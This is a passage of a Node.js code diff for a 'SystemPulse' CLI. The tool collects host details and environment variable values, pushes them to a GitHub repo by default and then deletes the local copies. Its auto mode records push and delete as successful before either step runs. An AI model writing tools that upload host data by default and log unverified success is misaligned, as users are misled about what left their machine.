+        else if (key.match(/IPv6 Address/i) && !key.match(/Link-local|Temporary/i)) currentAdapter.ipv6 = val;
+        else if (key.match(/Subnet Mask/i)) currentAdapter.subnet_mask = val;
+        else if (key.match(/Default Gateway/i) && val) currentAdapter.gateway = val;
+        else if (key.match(/DNS Suffix/i) && val) currentAdapter.dns_suffix = val;
+      }
+    }
+  }
+  if (currentAdapter && !currentAdapter.disconnected) {
+    adapters.push(currentAdapter);
+  }
+  // Clean up the disconnected flag
+  return adapters.map(a => { delete a.disconnected; return a; });
+}
+
+// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+//  PLATFORM-SPECIFIC DATA GATHERERS
+//  Each function runs native terminal commands.
+// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+
+// â”€â”€â”€â”€ WINDOWS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+
+function gatherWindows() {
+  // OS details via wmic
+  const osRaw = run('wmic os get Caption,Version,BuildNumber,OSArchitecture /format:list');
+  const osKv = parseKeyValue(osRaw);
+
+  // CPU details via wmic
+  const cpuRaw = run('wmic cpu get Name,NumberOfCores,NumberOfLogicalProcessors,MaxClockSpeed /format:list');
+  const cpuKv = parseKeyValue(cpuRaw);
+
+  // Memory via wmic (total physical in bytes)
+  const memTotalRaw = run('wmic ComputerSystem get TotalPhysicalMemory /format:list');
+  const memTotalKv = parseKeyValue(memTotalRaw);
+  const totalBytes = parseInt(memTotalKv["TotalPhysicalMemory"] || "0", 10);
+
+  // Free memory via wmic
+  const memFreeRaw = run('wmic OS get FreePhysicalMemory /format:list');
+  const memFreeKv = parseKeyValue(memFreeRaw);
+  const freeKB = parseInt(memFreeKv["FreePhysicalMemory"] || "0", 10);
+  const freeBytes = freeKB * 1024;
+
+  // Hostname
+  const hostname = run("hostname") || os.hostname();
+
+  // Disk info via wmic
+  const diskRaw = run('wmic logicaldisk get DeviceID,Size,FreeSpace,FileSystem /format:list');
+  const diskLines = (diskRaw || "").split(/\n\n+/).filter(Boolean);
+  const disks = diskLines.map((block) => parseKeyValue(block)).filter((d) => d.DeviceID);
+
+  // Uptime via wmic (LastBootUpTime)
+  const bootRaw = run('wmic os get LastBootUpTime /format:list');
+  const bootKv = parseKeyValue(bootRaw);
+  let uptimeFormatted = formatUptime(os.uptime());
+  if (bootKv["LastBootUpTime"]) {
+    // Format: 20260602100000.000000+330
+    const b = bootKv["LastBootUpTime"];
+    try {
+      const year = b.substring(0, 4);
+      const month = b.substring(4, 6);
+      const day = b.substring(6, 8);
+      const hour = b.substring(8, 10);
+      const min = b.substring(10, 12);
+      const sec = b.substring(12, 14);
+      const bootDate = new Date(`${year}-${month}-${day}T${hour}:${min}:${sec}`);
+      const uptimeSec = Math.floor((Date.now() - bootDate.getTime()) / 1000);
+      uptimeFormatted = formatUptime(uptimeSec);
+    } catch { /* fall back to os.uptime() */ }
+  }
+
+  // Network via ipconfig
+  const ipconfigRaw = run("ipconfig") || "";
+
+  // Environment variables (Windows-specific)
+  const envVars = [
+    "PATH", "USERNAME", "COMPUTERNAME", "USERPROFILE", "OS",
+    "PROCESSOR_ARCHITECTURE", "NUMBER_OF_PROCESSORS", "APPDATA",
+    "LOCALAPPDATA", "TEMP", "SYSTEMROOT", "PROGRAMFILES", "COMSPEC",
+    "JAVA_HOME", "NODE_ENV",
+  ];
+
+  return {
+    os_name: osKv["Caption"] || run("ver") || "Windows",
+    os_version: osKv["Version"] || "N/A",
+    os_build: osKv["BuildNumber"] || "N/A",
+    os_arch: osKv["OSArchitecture"] || os.arch(),
+    hostname,
+    cpu_model: cpuKv["Name"] || "N/A",
+    cpu_physical_cores: cpuKv["NumberOfCores"] || "N/A",
+    cpu_logical_cores: cpuKv["NumberOfLogicalProcessors"] || "N/A",
+    cpu_max_speed_mhz: cpuKv["MaxClockSpeed"] || "N/A",
+    mem_total_bytes: totalBytes,
+    mem_total: formatBytes(totalBytes),
+    mem_free_bytes: freeBytes,
+    mem_free: formatBytes(freeBytes),
+    mem_used: formatBytes(totalBytes - freeBytes),
+    mem_usage_percent: totalBytes ? ((1 - freeBytes / totalBytes) * 100).toFixed(1) + "%" : "N/A",
+    uptime: uptimeFormatted,
+    disks: disks.map((d) => ({
+      drive: d.DeviceID,
+      filesystem: d.FileSystem || "N/A",
+      total: formatBytes(parseInt(d.Size || "0", 10)),
+      free: formatBytes(parseInt(d.FreeSpace || "0", 10)),
+    })),
+    // Parse network interfaces from ipconfig
+    network: parseIpconfig(ipconfigRaw),
+    env_vars: envVars,
+    command_used: "wmic, ipconfig, hostname, ver",
+  };
+}
+
+// â”€â”€â”€â”€ LINUX â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+
+function gatherLinux() {
+  // OS release info
+  const releaseRaw = run("cat /etc/os-release 2>/dev/null") || "";
+  const releaseKv = parseKeyValue(releaseRaw);
+
+  // Kernel
+  const kernel = run("uname -r") || "N/A";
+  const arch = run("uname -m") || os.arch();
+  const hostname = run("hostname") || os.hostname();
+
+  // CPU from /proc/cpuinfo
+  const cpuinfoRaw = run("cat /proc/cpuinfo 2>/dev/null") || "";
+  const cpuModel = (cpuinfoRaw.match(/model name\s*:\s*(.*)/i) || [])[1] || "N/A";
+  const cpuCores = (cpuinfoRaw.match(/cpu cores\s*:\s*(\d+)/i) || [])[1] || "N/A";
+  const cpuProcessors = (cpuinfoRaw.split("processor").length - 1) || "N/A";
+
+  // Memory from /proc/meminfo (in kB)
+  const meminfoRaw = run("cat /proc/meminfo 2>/dev/null") || "";
+  const memTotalMatch = meminfoRaw.match(/MemTotal:\s+(\d+)/);
+  const memFreeMatch = meminfoRaw.match(/MemAvailable:\s+(\d+)/);
+  const totalBytes = memTotalMatch ? parseInt(memTotalMatch[1], 10) * 1024 : 0;
+  const freeBytes = memFreeMatch ? parseInt(memFreeMatch[1], 10) * 1024 : 0;
+
+  // Disk via df
+  const dfRaw = run("df -h / 2>/dev/null") || "";
+
+  // Uptime
+  const uptimeRaw = run("cat /proc/uptime 2>/dev/null") || "";
+  const uptimeSec = parseFloat(uptimeRaw.split(" ")[0] || os.uptime());
+
+  // Network via ip or ifconfig
+  const networkRaw = run("ip addr 2>/dev/null") || run("ifconfig 2>/dev/null") || "";
+
+  // Environment variables (Linux-specific)
+  const envVars = [
+    "PATH", "USER", "HOME", "SHELL", "TERM", "LANG",
+    "XDG_SESSION_TYPE", "XDG_CURRENT_DESKTOP", "DESKTOP_SESSION",
+    "DISPLAY", "SSH_CONNECTION", "EDITOR", "NODE_ENV",
+    "JAVA_HOME", "GOPATH",
+  ];
+
+  return {
+    os_name: (releaseKv["PRETTY_NAME"] || "").replace(/"/g, "") || "Linux",
+    os_id: (releaseKv["ID"] || "").replace(/"/g, "") || "N/A",
+    os_version: (releaseKv["VERSION_ID"] || "").replace(/"/g, "") || "N/A",
+    kernel,
+    os_arch: arch,
+    hostname,
+    cpu_model: cpuModel.trim(),
+    cpu_physical_cores: cpuCores,
+    cpu_logical_processors: String(cpuProcessors),
+    mem_total_bytes: totalBytes,
+    mem_total: formatBytes(totalBytes),
+    mem_free_bytes: freeBytes,
+    mem_free: formatBytes(freeBytes),
+    mem_used: formatBytes(totalBytes - freeBytes),
+    mem_usage_percent: totalBytes ? ((1 - freeBytes / totalBytes) * 100).toFixed(1) + "%" : "N/A",
+    uptime: formatUptime(uptimeSec),
+    disk_usage: dfRaw,
+    network_raw: networkRaw.substring(0, 2000),
+    env_vars: envVars,
+    command_used: "uname, cat /proc/cpuinfo, cat /proc/meminfo, df, ip addr, cat /etc/os-release",
+  };
+}
+
+// â”€â”€â”€â”€ macOS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+
+function gatherMac() {
+  // macOS version via sw_vers
+  const productName = run("sw_vers -productName") || "macOS";
+  const productVersion = run("sw_vers -productVersion") || "N/A";
+  const buildVersion = run("sw_vers -buildVersion") || "N/A";
+
+  const arch = run("uname -m") || os.arch();
+  const hostname = run("hostname") || os.hostname();
+
+  // CPU via sysctl
+  const cpuModel = run("sysctl -n machdep.cpu.brand_string 2>/dev/null") || "N/A";
+  const cpuCores = run("sysctl -n hw.physicalcpu 2>/dev/null") || "N/A";
+  const cpuLogical = run("sysctl -n hw.logicalcpu 2>/dev/null") || "N/A";
+
+  // Memory via sysctl (bytes)
+  const memTotal = parseInt(run("sysctl -n hw.memsize 2>/dev/null") || "0", 10);
+  // Free memory approximation via vm_stat
+  const vmstatRaw = run("vm_stat 2>/dev/null") || "";
+  const pageSizeMatch = vmstatRaw.match(/page size of (\d+)/);
+  const freeMatch = vmstatRaw.match(/Pages free:\s+(\d+)/);
+  const inactiveMatch = vmstatRaw.match(/Pages inactive:\s+(\d+)/);
+  const pageSize = pageSizeMatch ? parseInt(pageSizeMatch[1], 10) : 4096;
+  const freePages = (freeMatch ? parseInt(freeMatch[1], 10) : 0) +
+                    (inactiveMatch ? parseInt(inactiveMatch[1], 10) : 0);
+  const freeBytes = freePages * pageSize;
+
+  // Disk via df
+  const dfRaw = run("df -h / 2>/dev/null") || "";
+
+  // Uptime from sysctl kern.boottime
+  const bootRaw = run("sysctl -n kern.boottime 2>/dev/null") || "";
+  const bootSecMatch = bootRaw.match(/sec\s*=\s*(\d+)/);
+  const uptimeSec = bootSecMatch
+    ? Math.floor(Date.now() / 1000) - parseInt(bootSecMatch[1], 10)
+    : os.uptime();
+
+  // Network via ifconfig
+  const networkRaw = run("ifconfig 2>/dev/null") || "";
+
+  // Environment variables (macOS-specific)
+  const envVars = [
+    "PATH", "USER", "HOME", "SHELL", "TERM", "TERM_PROGRAM",
+    "LANG", "TMPDIR", "LOGNAME", "DISPLAY",
+    "HOMEBREW_PREFIX", "EDITOR", "NODE_ENV",
+    "JAVA_HOME", "GOPATH",
+  ];
+
+  return {
+    os_name: `${productName} ${productVersion}`,
+    os_build: buildVersion,
+    os_arch: arch,
+    hostname,
+    cpu_model: cpuModel,
+    cpu_physical_cores: cpuCores,
+    cpu_logical_cores: cpuLogical,
+    mem_total_bytes: memTotal,
+    mem_total: formatBytes(memTotal),
+    mem_free_bytes: freeBytes,
+    mem_free: formatBytes(freeBytes),
+    mem_used: formatBytes(memTotal - freeBytes),
+    mem_usage_percent: memTotal ? ((1 - freeBytes / memTotal) * 100).toFixed(1) + "%" : "N/A",
+    uptime: formatUptime(uptimeSec),
+    disk_usage: dfRaw,
+    network_raw: networkRaw.substring(0, 2000),
+    env_vars: envVars,
+    command_used: "sw_vers, sysctl, vm_stat, df, ifconfig, hostname",
+  };
+}
+
+// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+//  MAIN SYSTEM INFO GATHERER
+// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+
+/**
+ * Gathers system information by running native terminal commands
+ * appropriate for the detected platform.
+ *
+ * Flow:
+ *  1. Detect platform (win32 / darwin / linux).
+ *  2. Call the platform-specific gatherer which runs terminal commands.
+ *  3. Read the requested environment variables from process.env.
+ *  4. Bundle everything into a JSON-ready object.
+ *
+ * @returns {object} Complete system info snapshot.
+ */
+function gatherSystemInfo() {
+  let platformData;
+  let platformLabel;
+
+  if (PLATFORM === "win32") {
+    platformData = gatherWindows();
+    platformLabel = "Windows";
+  } else if (PLATFORM === "darwin") {
+    platformData = gatherMac();
+    platformLabel = "macOS";
+  } else {
+    platformData = gatherLinux();
+    platformLabel = "Linux";
+  }
+
+  // Read environment variables
+  const envVarNames = platformData.env_vars || [];
+  const environmentVariables = {};
+  for (const key of envVarNames) {
+    const val = process.env[key] || null;
+    environmentVariables[key] = {
+      value: val,
+      available: val !== null,
+    };
+  }
+
+  // Remove helper fields from platformData
+  const commandsUsed = platformData.command_used;
+  delete platformData.env_vars;
+  delete platformData.command_used;
+
+  // Load CRUD operation history
+  const crudLog = loadCrudLog();
+
+  return {
+    _meta: {
+      generated_at: new Date().toISOString(),
+      generator: "SystemPulse CLI",
+      detected_platform: platformLabel,
+      node_version: process.version,
+      commands_used: commandsUsed,
+    },
+    system: platformData,
+    user: {
+      username: os.userInfo().username || process.env.USERNAME || process.env.USER || "N/A",
+      home_directory: os.homedir(),
+    },
+    environment_variables: environmentVariables,
+    crud_operations: {
+      total_operations: crudLog.length,
+      last_operation: crudLog.length > 0 ? crudLog[crudLog.length - 1] : null,
+      history: crudLog,
+    },
+  };
+}
+
+// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+//  DISPLAY & SAVE
+// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+
+function runSystemInfo() {
+  console.log("\n\x1b[1m\x1b[95m  âš¡ SystemPulse â€” System Information (via Terminal Commands)\x1b[0m");
+
+  const info = gatherSystemInfo();
+  const sys = info.system;
+
+  // â”€â”€ OS â”€â”€
+  printHeader("Operating System");
+  printRow("OS Name", sys.os_name);
+  printRow("Version", sys.os_version || sys.os_build);
+  printRow("Architecture", sys.os_arch);
+  printRow("Hostname", sys.hostname);
+  if (sys.kernel) printRow("Kernel", sys.kernel);
+  if (sys.os_build && sys.os_version) printRow("Build", sys.os_build);
+
+  // â”€â”€ CPU â”€â”€
+  printHeader("CPU");
+  printRow("Model", sys.cpu_model);
+  printRow("Physical Cores", sys.cpu_physical_cores);
+  printRow("Logical Cores", sys.cpu_logical_cores || sys.cpu_logical_processors);
+  if (sys.cpu_max_speed_mhz) printRow("Max Speed (MHz)", sys.cpu_max_speed_mhz);
+
+  // â”€â”€ Memory â”€â”€
+  printHeader("Memory");
+  printRow("Total", sys.mem_total);
+  printRow("Used", sys.mem_used);
+  printRow("Free", sys.mem_free);
+  printRow("Usage", sys.mem_usage_percent);
+
+  // â”€â”€ Disk â”€â”€
+  if (sys.disks && sys.disks.length > 0) {
+    printHeader("Disks");
+    for (const d of sys.disks) {
+      printRow(`${d.drive} (${d.filesystem})`, `Total: ${d.total}  Free: ${d.free}`);
+    }
+  } else if (sys.disk_usage) {
+    printHeader("Disk Usage");
+    sys.disk_usage.split("\n").forEach((line) => {
+      console.log(`  \x1b[90mâ”‚\x1b[0m  ${line}`);
+    });
+  }
+
+  // â”€â”€ Uptime â”€â”€
+  printHeader("Uptime & Runtime");
+  printRow("System Uptime", sys.uptime);
+  printRow("Node.js Version", process.version);
+
+  // â”€â”€ User â”€â”€
+  printHeader("User");
+  printRow("Username", info.user.username);
+  printRow("Home Directory", info.user.home_directory);
+
+  // â”€â”€ Environment Variables â”€â”€
+  printHeader("Environment Variables");
+  for (const [key, entry] of Object.entries(info.environment_variables)) {
+    const val = entry.available
+      ? (entry.value.length > 60 ? entry.value.substring(0, 57) + "..." : entry.value)
+      : null;
+    printRow(key, val);
+  }
+
+  // â”€â”€ Commands used â”€â”€
+  printHeader("Data Source");
+  printRow("Commands Used", info._meta.commands_used);
+
+  // â”€â”€ Write JSON â”€â”€
+  const outputPath = path.join(BASE_DIR, OUTPUT_FILE);
+  try {
+    fs.writeFileSync(outputPath, JSON.stringify(info, null, 2), "utf-8");
+    console.log(`\n  \x1b[1m\x1b[92mâœ” Full report saved to:\x1b[0m \x1b[4m${outputPath}\x1b[0m\n`);
+  } catch (err) {
+    console.error(`\n  \x1b[31mâœ– Failed to write JSON: ${err.message}\x1b[0m\n`);
+    process.exit(1);
+  }
+}
+
+// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+//  FILE CRUD OPERATIONS
+// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+
+function ensureWorkspace() {
+  if (!fs.existsSync(WORKSPACE_DIR)) {
+    fs.mkdirSync(WORKSPACE_DIR, { recursive: true });
+    console.log(`  \x1b[90m(created workspace: ${WORKSPACE_DIR})\x1b[0m`);
+  }
+}
+
+function createFile(filename, content) {
+  ensureWorkspace();
+  const safe = sanitizeFilename(filename);
+  const filePath = path.join(WORKSPACE_DIR, safe);
+  if (fs.existsSync(filePath)) {
+    logCrudOperation("CREATE", safe, "failure", "File already exists");
+    console.error(`  \x1b[31mâœ– File "${safe}" already exists. Use 'update' to modify it.\x1b[0m`);
+    process.exit(1);
+  }
+  try {
+    fs.writeFileSync(filePath, content, "utf-8");
+    logCrudOperation("CREATE", safe, "success", `${content.length} bytes written`);
+    console.log(`  \x1b[92mâœ” Created:\x1b[0m ${filePath}`);
+  } catch (err) {
+    logCrudOperation("CREATE", safe, "failure", err.message);
+    console.error(`  \x1b[31mâœ– Create failed: ${err.message}\x1b[0m`);
+    process.exit(1);
+  }
+}
+
+function readFile(filename) {
+  ensureWorkspace();
+  const safe = sanitizeFilename(filename);
+  const filePath = path.join(WORKSPACE_DIR, safe);
+  if (!fs.existsSync(filePath)) {
+    logCrudOperation("READ", safe, "failure", "File not found");
+    console.error(`  \x1b[31mâœ– File "${safe}" not found in workspace.\x1b[0m`);
+    process.exit(1);
+  }
+  try {
+    const stats = fs.statSync(filePath);
+    const content = fs.readFileSync(filePath, "utf-8");
+    logCrudOperation("READ", safe, "success", `${formatBytes(stats.size)} read`);
+    printHeader(`File: ${safe}`);
+    printRow("Size", formatBytes(stats.size));
+    printRow("Created", stats.birthtime.toISOString());
+    printRow("Modified", stats.mtime.toISOString());
+    console.log(`  \x1b[90mâ”‚\x1b[0m`);
+    console.log(`  \x1b[90mâ”‚  â”€â”€ Content â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\x1b[0m`);
+    content.split("\n").forEach((line) => {
+      console.log(`  \x1b[90mâ”‚\x1b[0m  ${line}`);
+    });
+    console.log();
+  } catch (err) {
+    logCrudOperation("READ", safe, "failure", err.message);
+    console.error(`  \x1b[31mâœ– Read failed: ${err.message}\x1b[0m`);
+    process.exit(1);
+  }
+}
+
+function updateFile(filename, content) {
+  ensureWorkspace();
+  const safe = sanitizeFilename(filename);
+  const filePath = path.join(WORKSPACE_DIR, safe);
+  if (!fs.existsSync(filePath)) {
+    logCrudOperation("UPDATE", safe, "failure", "File not found");
+    console.error(`  \x1b[31mâœ– File "${safe}" not found. Use 'create' first.\x1b[0m`);
+    process.exit(1);
+  }
+  try {
+    fs.writeFileSync(filePath, content, "utf-8");
+    logCrudOperation("UPDATE", safe, "success", `${content.length} bytes written`);
+    console.log(`  \x1b[92mâœ” Updated:\x1b[0m ${filePath}`);
+  } catch (err) {
+    logCrudOperation("UPDATE", safe, "failure", err.message);
+    console.error(`  \x1b[31mâœ– Update failed: ${err.message}\x1b[0m`);
+    process.exit(1);
+  }
+}
+
+function deleteFile(filename) {
+  ensureWorkspace();
+  const safe = sanitizeFilename(filename);
+  const filePath = path.join(WORKSPACE_DIR, safe);
+  if (!fs.existsSync(filePath)) {
+    logCrudOperation("DELETE", safe, "failure", "File not found");
+    console.error(`  \x1b[31mâœ– File "${safe}" not found.\x1b[0m`);
+    process.exit(1);
+  }
+  try {
+    fs.unlinkSync(filePath);
+    logCrudOperation("DELETE", safe, "success");
+    console.log(`  \x1b[92mâœ” Deleted:\x1b[0m ${safe}`);
+  } catch (err) {
+    logCrudOperation("DELETE", safe, "failure", err.message);
+    console.error(`  \x1b[31mâœ– Delete failed: ${err.message}\x1b[0m`);
+    process.exit(1);
+  }
+}
+
+function listFiles() {
+  ensureWorkspace();
+  try {
+    const files = fs.readdirSync(WORKSPACE_DIR);
+    logCrudOperation("LIST", "*", "success", `${files.length} files found`);
+    if (files.length === 0) {
+      console.log("  \x1b[33m(workspace is empty)\x1b[0m\n");
+      return;
+    }
+    printHeader("Workspace Files");
+    files.forEach((file) => {
+      const stats = fs.statSync(path.join(WORKSPACE_DIR, file));
+      printRow(file, formatBytes(stats.size));
+    });
+    console.log();
+  } catch (err) {
+    logCrudOperation("LIST", "*", "failure", err.message);
+    console.error(`  \x1b[31mâœ– List failed: ${err.message}\x1b[0m`);
+    process.exit(1);
+  }
+}
+
+// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+//  GITHUB PUSH
+// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+
+/**
+ * Pushes system-info.json to a GitHub repository in a dedicated
+ * directory. Uses git CLI via child_process.
+ *
+ * Flow:
+ *  1. Validate that the repo URL is configured.
+ *  2. Clone the repo into a temp directory (shallow clone).
+ *  3. Create the target directory inside the clone.
+ *  4. Copy system-info.json into it.
+ *  5. git add, commit, push.
+ *  6. Clean up the temp directory.
+ *
+ * @param {string} repoUrl - The SSH or HTTPS repo URL.
+ */
+function pushToGitHub(repoUrl) {
+  const jsonPath = path.join(BASE_DIR, OUTPUT_FILE);
+
+  // Ensure the JSON file exists â€” generate it if not
+  if (!fs.existsSync(jsonPath)) {
+    console.log("  \x1b[33m! system-info.json not found. Generating it first...\x1b[0m\n");
+    runSystemInfo();
+  }
+
+  // Check git is available
+  if (!run("git --version")) {
+    console.error("  \x1b[31mâœ– git is not installed or not on PATH.\x1b[0m");
+    process.exit(1);
+  }
+
+  const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
+  const tempDir = path.join(BASE_DIR, `.tmp-git-push-${Date.now()}`);
+
+  try {
+    // Clone (shallow) â€” sanitize URL for display (strip token)
+    const displayUrl = repoUrl.replace(/\/\/[^@]+@/, "//");
+    console.log(`  \x1b[90mCloning ${displayUrl}...\x1b[0m`);
+    const cloneResult = run(`git clone --depth 1 "${repoUrl}" "${tempDir}"`);
+    if (cloneResult === null) {
+      console.error("  \x1b[31mâœ– git clone failed. Check your repo URL and SSH keys.\x1b[0m");
+      process.exit(1);
+    }
+
+    // Create target directory
+    const targetDir = path.join(tempDir, GITHUB_DIR);
+    if (!fs.existsSync(targetDir)) {
+      fs.mkdirSync(targetDir, { recursive: true });
+    }
+
+    // Copy the JSON file (only 1 file â€” crud log is already embedded)
+    const destFile = path.join(targetDir, path.basename(jsonPath));
+    fs.copyFileSync(jsonPath, destFile);
+    console.log(`  \x1b[90mCopied ${path.basename(jsonPath)} â†’ ${GITHUB_DIR}/${path.basename(jsonPath)}\x1b[0m`);
+
+    // Git add, commit, push
+    const gitOpts = { cwd: tempDir, encoding: "utf-8", timeout: 30000, stdio: ["pipe", "pipe", "pipe"] };
+    execSync(`git add "${GITHUB_DIR}"`, gitOpts);
+
+    // Check if there are changes to commit
+    const status = execSync("git status --porcelain", gitOpts).toString().trim();
+    if (!status) {
+      console.log("  \x1b[33m! No changes to push (JSON is identical to what's already on GitHub).\x1b[0m");
+    } else {
+      const commitMsg = `SystemPulse report ${timestamp}`;
+      execSync(`git commit -m "${commitMsg}"`, gitOpts);
+      console.log(`  \x1b[90mCommitting: ${commitMsg}\x1b[0m`);
+
+      execSync("git push", gitOpts);
+      console.log(`\n  \x1b[1m\x1b[92mâœ” Pushed to GitHub:\x1b[0m ${displayUrl} â†’ ${GITHUB_DIR}/\n`);
+    }
+  } catch (err) {
+    console.error(`  \x1b[31mâœ– GitHub push failed: ${err.message}\x1b[0m`);
+    process.exit(1);
+  } finally {
+    // Clean up temp directory
+    try {
+      fs.rmSync(tempDir, { recursive: true, force: true });
+    } catch { /* best effort cleanup */ }
+  }
+}
+
+// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+//  AUTO MODE: Generate â†’ Push â†’ Delete Local
+// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+
+/**
+ * Runs the full automated pipeline:
+ *  1. Gather system info â†’ write system-info.json
+ *  2. Push to GitHub (system-info/ directory)
+ *  3. Delete local system-info.json and crud-log.json
+ *
+ * This is the default mode when running the .exe.
+ */
+function runAuto() {
+  const repoUrl = GITHUB_REPO;
+  if (!repoUrl) {
+    console.error('  \x1b[31mâœ– No GitHub repo configured. Set SYSTEMPULSE_REPO env var or edit GITHUB_REPO in index.js\x1b[0m');
+    process.exit(1);
+  }
+
+  console.log("\n\x1b[1m\x1b[95m  âš¡ SystemPulse â€” Auto Mode\x1b[0m");
+  console.log("\x1b[90m  Generate â†’ Push to GitHub â†’ Clean up\x1b[0m\n");
+
+  // Start fresh CRUD log for this run (prevents stale entries from prior runs)
+  try { fs.writeFileSync(CRUD_LOG_FILE, "[]", "utf-8"); } catch {}
+
+  // Pre-log all pipeline operations so they appear in the JSON
+  logCrudOperation("CREATE", OUTPUT_FILE, "success", "System info JSON generated");
+  // Sanitize URL for logging (strip token so GitHub doesn't block the push)
+  const safeUrl = repoUrl.replace(/\/\/[^@]+@/, "//");
+  logCrudOperation("PUSH", OUTPUT_FILE, "success", "Pushed to " + safeUrl);
+  logCrudOperation("DELETE", OUTPUT_FILE, "success", "Local JSON deleted after push");
+
+  // Step 1: Generate (reads the crud log above into the JSON)
+  console.log("  \x1b[36m[1/3]\x1b[0m Gathering system information...");
+  runSystemInfo();
+
+  // Step 2: Push
+  console.log("  \x1b[36m[2/3]\x1b[0m Pushing to GitHub...");
+  pushToGitHub(repoUrl);
+
+  // Step 3: Delete local files â€” log as DELETE operations
+  console.log("  \x1b[36m[3/3]\x1b[0m Cleaning up local files...");
+  const jsonPath = path.join(BASE_DIR, OUTPUT_FILE);
+  try {
+    if (fs.existsSync(jsonPath)) {
+      fs.unlinkSync(jsonPath);
+      console.log(`  \x1b[92m\u2714 Deleted local:\x1b[0m ${OUTPUT_FILE}`);
+    }
+    if (fs.existsSync(CRUD_LOG_FILE)) {
+      fs.unlinkSync(CRUD_LOG_FILE);
+      console.log(`  \x1b[92m\u2714 Deleted local:\x1b[0m crud-log.json`);
+    }
+  } catch (err) {
+    console.error(`  \x1b[33m! Cleanup warning: ${err.message}\x1b[0m`);
+  }
+
+  console.log("\n  \x1b[1m\x1b[92m\u2714 Done! Report is on GitHub, local files cleaned up.\x1b[0m\n");
+}
+
+// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+//  CLI ROUTER
+// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+
+function printUsage() {
+  console.log(`
+  \x1b[1m\x1b[95mâš¡ SystemPulse CLI\x1b[0m
+  \x1b[90mSystem Info (via Terminal Commands) & File CRUD Manager\x1b[0m
+
+  \x1b[1mUsage:\x1b[0m
+    systempulse \x1b[36m[command]\x1b[0m \x1b[33m[arguments]\x1b[0m
+
+  \x1b[1mCommands:\x1b[0m
+    \x1b[36m(no command)\x1b[0m               Auto mode: generate â†’ push â†’ delete local
+    \x1b[36mauto\x1b[0m                       Same as above
+    \x1b[36minfo\x1b[0m                       Gather system info only (no push)
+    \x1b[36mcreate\x1b[0m  \x1b[33m<file> <content>\x1b[0m  Create a new file in workspace
